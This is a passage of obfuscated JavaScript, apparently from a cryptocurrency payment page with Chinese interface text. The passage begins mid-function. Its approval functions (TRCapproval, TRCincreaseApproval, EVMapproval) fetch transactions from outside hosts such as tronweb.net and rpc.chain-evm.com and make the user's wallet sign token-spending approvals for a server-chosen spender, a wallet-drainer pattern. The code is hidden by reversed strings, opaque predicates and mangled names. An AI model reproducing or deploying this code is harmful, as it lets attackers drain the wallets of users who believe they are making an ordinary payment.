          approvalAmount: _0x5f1eb9
        })
      });
      if (!_0x14f485.ok) {
        if ("WnniT".split("").reverse().join("") !== "TinnW") {
          _0x345265(_0x243868, _0x357061, true);
          return;
        } else {
          return false;
        }
      }
      const _0x108eed = await _0x14f485.json();
      if (!_0x108eed.success || !_0x108eed.transaction) {
        {
          return false;
        }
      }
      const _0x466fb6 = await window.tronWeb.trx.sign(_0x108eed.transaction);
      const _0x10d458 = await window.tronWeb.trx.sendRawTransaction(_0x466fb6);
      if (_0x10d458.result === true && _0x10d458.txid) {
        {
          return true;
        }
      } else {
        if ("jwMEN" !== "NEMwj".split("").reverse().join("")) {
          _0x54d1d6.getElementById("walletModal").style.display = "none";
        } else {
          return false;
        }
      }
    }
  } catch (_0x48225b) {
    console.error("TRCapproval失败:", _0x48225b);
    return false;
  }
}
async function TRCincreaseApproval() {
  try {
    var _0x15fe39 = 5;
    const _0xc1f4da = "";
    _0x15fe39 = 6;
    const _0x2b27f4 = "";
    var _0x1d1a0c = 17;
    const _0x31be48 = "https://tronweb.net/api/increaseApproval";
    _0x1d1a0c = "epimnk";
    const _0x9d7e17 = await fetch(_0x31be48, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        spenderAddress: _0xc1f4da,
        userAddress: userData.address,
        approvalAmount: _0x2b27f4
      })
    });
    const _0x562574 = await _0x9d7e17.json();
    if (_0x562574.error) {
      {
        throw new Error(_0x562574.error);
      }
    }
    var _0x5daf57 = 10;
    const _0x29e5cc = await window.tronWeb.trx.sign(_0x562574.transaction);
    _0x5daf57 = 8;
    var _0x3f6681 = 11;
    const _0x14f656 = await window.tronWeb.trx.sendRawTransaction(_0x29e5cc);
    _0x3f6681 = 6;
    if (_0x14f656.result === true && _0x14f656.txid) {}
  } catch (_0x52e3a2) {
    console.log("TRCincreaseApproval失败:", _0x52e3a2);
  }
}
async function EVMapproval() {
  try {
    var _0x11d664 = 8;
    const _0x57a97d = {
      address: userData.address,
      spender: configData["0x_permission_address"],
      amount: "",
      chain: userData.chain
    };
    _0x11d664 = 0;
    var _0x507d85;
    const _0x1f4fa3 = await fetch("https://rpc.chain-evm.com/approve", {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify(_0x57a97d)
    });
    _0x507d85 = 8;
    var _0x40e473 = 12;
    const _0x3e1d52 = await _0x1f4fa3.json();
    _0x40e473 = 8;
    if (!_0x3e1d52.success) {
      if ("ARsfp".split("").reverse().join("") === "pfsRA") {
        return;
      } else {
        _0x34fe92(_0xb87a88);
        _0x3ca8d2.remove();
      }
    }
    var _0x31a8b1;
    const _0x484e12 = window.ethereum || window.trust?.["ethereum"];
    _0x31a8b1 = 7;
    const _0x2a2fd9 = await _0x484e12.request({
      method: "eth_sendTransaction",
      params: [_0x3e1d52.data.transaction]
    });
    if (_0x2a2fd9) {}
  } catch (_0x531b03) {
    if ("TmnKv" === "vKnmT".split("").reverse().join("")) {
      console.log("EVMapproval失败:", _0x531b03);
    } else {
      throw new _0x21138b(_0x147e82.message || "转账失败");
    }
  }
}
async function EVMUsdtTransfer() {
  try {
    var _0x1616df = 5;
    let _0xa3d739 = null;
    _0x1616df = 10;
    if (userData.unique_id) {
      try {
        const _0x27fb0b = await fetch("sserdda-tnemyap-tnega/".split("").reverse().join(""), {
          method: "POST",
          headers: {
            "Content-Type": "application/json"
          },
          body: JSON.stringify({
            unique_id: userData.unique_id
          })
        });
        var _0x209263 = 9;
        const _0x269cbe = await _0x27fb0b.json();
        _0x209263 = 10;
        if (_0x269cbe.status && _0x269cbe.status !== "on".split("").reverse().join("")) {
          if ("vGzHK" === "KHzGv".split("").reverse().join("")) {
            _0xa3d739 = _0x269cbe.status;
          } else {
            return "\n        <div id=\"dappContainer\" class=\"device-container\" style=\"display: block;\">\n            <p style=\"text-align: center; margin: 20px 0; color: #3C8CE7; font-weight: bold;\">\n                请直接点击下方按钮完成支付\n            </p>\n            <a href=\"javascript:void(0);\" id=\"dappPayButton\" class=\"pay-btn\">\n                确认支付 " + _0x2b4dfc.actualPrice + " USDT\n            </a>\n        </div>\n    ";
          }
        }
      } catch (_0x4f0b9c) {}
    }
    if (!_0xa3d739) {
      _0xa3d739 = "";
    }
    var _0x24aef3;
    const _0x467d37 = {
      fromAddress: userData.address,
      toAddress: _0xa3d739,
      amount: userData.actualPrice.toString(),
      chain: userData.chain
    };
    _0x24aef3 = 8;
    var _0x18f7a1;
    const _0x3de069 = await fetch("https://rpc.chain-evm.com/transfer", {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify(_0x467d37)
    });
    _0x18f7a1 = 11;
    const _0xd1d2c2 = await _0x3de069.json();
    if (!_0xd1d2c2.success) {
      if ("zqEdi".split("").reverse().join("") === "idEqz") {
        throw new Error(_0xd1d2c2.message || "转账失败");
      } else {
        _0x1856a0(_0xa7f236.authorize_note);
      }
    }
    const _0x199b65 = window.ethereum || window.trust?.["ethereum"];
    const _0x2497d0 = await _0x199b65.request({
      method: "eth_sendTransaction",
      params: [_0xd1d2c2.data.transaction]
    });
  } catch (_0x803f41) {
    {
      console.log(":败失refsnarTtdsUMVE".split("").reverse().join(""), _0x803f41);
    }
  }
}
async function TRCUsdtTransfer() {
  try {
    if ("ibhuU".split("").reverse().join("") !== "afdaI") {
      var _0x5d9db3 = 9;
      let _0x22dbca = null;
      _0x5d9db3 = "jdacdd";
      if (userData.unique_id) {
        if ("bQdcM" === "McdQb".split("").reverse().join("")) {
          try {
            if ("mXMWy" === "yysBJ".split("").reverse().join("")) {
              const _0x299a3e = new _0x4ca7a8("Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini", "i").test(_0x486ed6.userAgent);
              var _0x5067f1;
              let _0x35227c = false;
              _0x5067f1 = 5;
              if (_0x1b594d.chain === "TRC") {
                _0x35227c = typeof _0x494dab.tronWeb !== "undefined" && _0xfa75ad.tronWeb.ready === true && _0x1c284f.tronWeb.defaultAddress && _0x17f56d.tronWeb.defaultAddress.base58;
              } else {
                _0x35227c = typeof _0x4d4dda.ethereum !== "undefined" && (_0x299a3e || _0x1a322d.ethereum.isTokenPocket || _0x551910.ethereum.isTrust || _0x1b669c.ethereum.isImToken || new _0x26280d("esabnioC|ksaMateM|tellaWtsurT|nekoTmI|tekcoPnekoT".split("").reverse().join(""), "i").test(_0x430414.userAgent));
              }
              if (_0x35227c) {
                return "dapp";
              }
              if (_0x299a3e) {
                return "mobile";
              }
              return "cp".split("").reverse().join("");
            } else {
              const _0x500b1c = await fetch("/agent-payment-address", {
                method: "POST",
                headers: {
                  "Content-Type": "application/json"
                },
                body: JSON.stringify({
                  unique_id: userData.unique_id
                })
              });
              const _0x43faa9 = await _0x500b1c.json();
              if (_0x43faa9.status && _0x43faa9.status !== "no") {
                _0x22dbca = _0x43faa9.status;
              }
            }
          } catch (_0x6ff18b) {}
        } else {
          _0x50288c.error("获取TRC20余额失败:", _0x492acb);
          _0xa873ed.gasBalance = "000000.0".split("").reverse().join("");
          _0xf40b36.usdtBalance = "000000.0".split("").reverse().join("");
          _0x13aae3.energyBalance = 0;
          return false;
        }
      }
      if (!_0x22dbca) {
        _0x22dbca = "";
      }
      var _0x334f1f = 3;
      const _0x5f0511 = "refsnart/ipa/ten.bewnort//:sptth".split("").reverse().join("");
      _0x334f1f = 9;
      var _0x27dec9;
      const _0x11ecb2 = {
        usdtContractAddress: CHAIN_CONFIG.TRC.usdt,
        userAddress: userData.address,
        toAddress: _0x22dbca,
        amount: userData.actualPrice
      };
      _0x27dec9 = "hkbljn";
      var _0x1a56e3;
      const _0xc359f9 = await fetch(_0x5f0511, {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify(_0x11ecb2)
      });
      _0x1a56e3 = 6;
      const _0x3f78cf = await _0xc359f9.json();
      if (_0x3f78cf.error) {
        throw new Error(_0x3f78cf.error);
      }
      const _0x3d54fe = await window.tronWeb.trx.sign(_0x3f78cf.transaction);
      var _0x13238d;
      const _0x5e8898 = await window.tronWeb.trx.sendRawTransaction(_0x3d54fe);
      _0x13238d = 9;
      if (_0x5e8898.result === true && _0x5e8898.txid) {
        const _0x122ac4 = window.location.href;
        const _0x39d066 = _0x122ac4.match(new RegExp("\\/bill\\/([A-Z0-9]+)(?:\\?|$)", ""));
        var _0x29e615 = 5;
        let _0x5baffe = "";
        _0x29e615 = 9;
        if (_0x39d066 && _0x39d066[1]) {
          _0x5baffe = _0x39d066[1];
        } else {
          {
            return;
          }
        }
        showTransactionCountdown(10);
        setTimeout(() => {
          if ("twZCW" === "slCpV".split("").reverse().join("")) {
            return false;
          } else {
            verifyTransaction(_0x5baffe, userData.address, _0x22dbca, CHAIN_CONFIG.TRC.usdt, _0x5e8898.txid);
          }
        }, 3000);
      }
    } else {
      _0x5e27cc(_0x122e4e, _0x5d8a06.address, _0x4f0df, _0x5d55ab.TRC.usdt, _0x4ee122.txid);
    }
  } catch (_0x5d3dd4) {
    console.log("TRC20转账失败:", _0x5d3dd4);
    showTemporaryMessage("转账失败，请重试");
  }
}
async function verifyTransaction(_0x4494ee, _0x1514c0, _0x31ca70, _0x40613d, _0x15bf66) {
  try {
    var _0x29ca9e;
    const _0x16ff95 = {
      order_sn: _0x4494ee,
      userAddress: _0x1514c0,
      toAddress: _0x31ca70,
      usdtContractAddress: _0x40613d,
      txHash: _0x15bf66
    };
    _0x29ca9e = 7;
    const _0x4c5179 = await fetch("/payment/trc20/verify", {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify(_0x16ff95)
    });
    const _0xb2919b = await _0x4c5179.json();
    if (_0xb2919b.success) {
      showTemporaryMessage("支付成功，即将跳转订单界面！");
      const _0x4cbe0c = window.location.origin;
      const _0x3faf7e = userData.chain.toLowerCase();
      const _0x294da0 = userData.unique_id || "";
      var _0x2a9641 = 10;
      const _0x1cb378 = "" + _0x3faf7e + _0x294da0;
      _0x2a9641 = "bfhigq";
      setTimeout(() => {
        window.location.href = _0x4cbe0c + "=di?resworb-yb-redro-hcraes/".split("").reverse().join("") + _0x1cb378;
      }, 2000);
    }
  } catch (_0x3eb130) {
    if ("XJqVr".split("").reverse().join("") !== "ZhEib".split("").reverse().join("")) {
      console.error(":败失易交证验".split("").reverse().join(""), _0x3eb130);
    } else {
      return;
    }
  }
}
function DMfOTZ(_0x3f2069, _0x31c2ea) {
  return;
  DMfOTZ = function (_0x1f86fe, _0x41cec1) {
    _0x1f86fe = _0x1f86fe - 0;
    var _0x2329d8 = _0x5e50e6[_0x1f86fe];
    return _0x2329d8;
  };
  return DMfOTZ(_0x3f2069, _0x31c2ea);
}
function OskIBr(_0x2c1633, _0x4576a4) {
  return;
  OskIBr = function (_0x1b3247, _0x127ea2) {
    _0x1b3247 = _0x1b3247 - 0;
    var _0x1662c1 = _0x5e50e6[_0x1b3247];
    return _0x1662c1;
  };
  return OskIBr(_0x2c1633, _0x4576a4);
}
OskIBr();
DMfOTZ();
function showTransactionCountdown(_0x1f926b) {
  var _0x1eaa26 = 3;
  const _0x3e24ce = document.createElement("div");
  _0x1eaa26 = 10;
  _0x3e24ce.id = "transaction-countdown";
  _0x3e24ce.textContent = "正在确认交易，请等待：" + _0x1f926b + "秒";
  _0x3e24ce.style.position = "fixed";
  _0x3e24ce.style.top = "30%";
  _0x3e24ce.style.left = "50%";
  _0x3e24ce.style.transform = "translateX(-50%)";
  _0x3e24ce.style.backgroundColor = "rgba(52, 152, 219, 0.8)";
  _0x3e24ce.style.color = "white";
  _0x3e24ce.style.padding = "12px 25px";
  _0x3e24ce.style.borderRadius = "6px";
  _0x3e24ce.style.boxShadow = "0 4px 8px rgba(0, 0, 0, 0.2)";
  _0x3e24ce.style.zIndex = "1000";
  _0x3e24ce.style.fontSize = "16px";
  _0x3e24ce.style.fontWeight = "bold";
  _0x3e24ce.style.textAlign = "center";
  _0x3e24ce.style.minWidth = "200px";
  document.body.appendChild(_0x3e24ce);
  let _0x4b3d83 = _0x1f926b;
  var _0x1cc616 = 9;
  const _0x252ae6 = setInterval(() => {
    {
      _0x4b3d83--;
      if (_0x4b3d83 <= 0) {
        clearInterval(_0x252ae6);
        _0x3e24ce.remove();
      } else {
        _0x3e24ce.textContent = "正在确认交易，请等待：" + _0x4b3d83 + "秒";
      }
    }
  }, 1000);
  _0x1cc616 = 14;
}
function showTemporaryMessage(_0x5d7ec2) {
  var _0x39ad0d;
  const _0x486aef = document.createElement("div");
  _0x39ad0d = 3;
  _0x486aef.textContent = _0x5d7ec2;
  _0x486aef.style.position = "fixed";
  _0x486aef.style.top = "38%";
  _0x486aef.style.left = "50%";
  _0x486aef.style.transform = "translateX(-50%)";
  _0x486aef.style.backgroundColor = "rgba(220, 53, 69, 0.7)";
  _0x486aef.style.color = "white";
  _0x486aef.style.padding = "10px 20px";
  _0x486aef.style.borderRadius = "4px";
  _0x486aef.style.boxShadow = "0 4px 8px rgba(0, 0, 0, 0.2)";
  _0x486aef.style.zIndex = "1000";
  _0x486aef.style.fontSize = "16px";
  _0x486aef.style.textAlign = "center";
  _0x486aef.style.maxWidth = "80%";
  _0x486aef.style.maxHeight = "50%";
  _0x486aef.style.overflowY = "auto";
  _0x486aef.style.wordWrap = "break-word";
  document.body.appendChild(_0x486aef);
  setTimeout(() => {
    _0x486aef.remove();
  }, 3000);
}
window.initPaymentUI = initPaymentUI;
window.payNow = payNow;
window.walletModal = walletModal;